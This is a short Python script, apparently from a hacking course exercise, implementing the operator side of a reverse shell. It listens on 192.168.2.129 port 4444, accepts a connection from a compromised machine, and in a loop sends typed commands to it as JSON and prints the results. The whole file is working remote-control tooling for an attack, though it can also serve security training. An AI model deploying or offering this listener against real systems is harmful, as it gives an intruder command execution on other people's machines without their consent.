import json
import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode('latin1'))
        # print(json_data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('latin1')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        # self.connection.send(command.encode())
        # return self.connection.recv()

        self.reliable_send(command.encode())
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">>> ")
            result = self.execute_remotely(command)
            print(result.encode('latin1'))


listener = Listener("192.168.2.129", 4444)
listener.run()